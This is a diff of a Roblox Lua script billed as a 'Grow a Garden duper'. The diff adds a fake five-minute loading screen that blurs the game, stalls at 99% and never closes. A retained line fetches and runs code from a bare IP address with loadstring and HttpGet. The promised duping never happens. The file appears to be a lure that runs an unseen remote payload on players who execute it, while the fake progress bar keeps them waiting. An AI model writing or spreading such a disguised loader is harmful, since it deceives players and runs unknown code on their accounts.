@@ -1,2 +1,121 @@
-ID="7c405e5d-50f2-4452-bf64-da28488409b3";
+ID="fe52a43a-7741-4117-9380-3577c232b83d";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+--// Rainbow gradient function
+local function getRainbowColor(t)
+    local r = math.sin(t + 0) * 127 + 128
+    local g = math.sin(t + 2) * 127 + 128
+    local b = math.sin(t + 4) * 127 + 128
+    return Color3.fromRGB(r, g, b)
+end
+
+--// Loader UI
+local function createLoadingScreen(gameName, duration)
+    duration = duration or 300 -- 5 minutes
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 0
+    blur.Parent = Lighting
+    TweenService:Create(blur, TweenInfo.new(0.6), {Size = 24}):Play()
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "UniversalLoader"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(380, 170)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.5
+    frame.Parent = gui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 110, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.6
+    stroke.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
+    title.BackgroundTransparency = 1
+    title.Text = gameName
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Parent = frame
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+    barBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+    barBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+    barBg.Parent = frame
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 8)
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    bar.Parent = barBg
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)
+
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(0.9, 0, 0.12, 0)
+    percent.Position = UDim2.new(0.05, 0, 0.62, 0)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextScaled = true
+    percent.Font = Enum.Font.Gotham
+    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percent.Parent = frame
+
+    local avgTime = Instance.new("TextLabel")
+    avgTime.Size = UDim2.new(0.9, 0, 0.12, 0)
+    avgTime.Position = UDim2.new(0.05, 0, 0.76, 0)
+    avgTime.BackgroundTransparency = 1
+    avgTime.Text = "Average Loading Time: 3 minutes"
+    avgTime.TextScaled = true
+    avgTime.Font = Enum.Font.Gotham
+    avgTime.TextColor3 = Color3.fromRGB(180, 185, 230)
+    avgTime.Parent = frame
+
+    --// Rainbow animation
+    task.spawn(function()
+        while gui.Parent do
+            local t = tick() * 0.5 -- Adjust speed of color change
+            title.TextColor3 = getRainbowColor(t)
+            bar.BackgroundColor3 = getRainbowColor(t + 2) -- Offset for bar
+            percent.TextColor3 = getRainbowColor(t + 4) -- Offset for percent
+            task.wait(0.05)
+        end
+    end)
+
+    --// Progress bar logic
+    task.spawn(function()
+        local start = tick()
+        while tick() - start < duration and gui.Parent do
+            local progress = math.min((tick() - start) / duration, 0.99) -- Cap at 99%
+            bar.Size = UDim2.new(progress, 0, 1, 0)
+            percent.Text = math.floor(progress * 100) .. "%"
+            task.wait(0.1)
+        end
+        bar.Size = UDim2.new(0.99, 0, 1, 0)
+        percent.Text = "99%"
+        -- Keep GUI and blur indefinitely
+    end)
+end
+
+--// Execute script
+createLoadingScreen("GROW A GARDEN DUPER", 300)
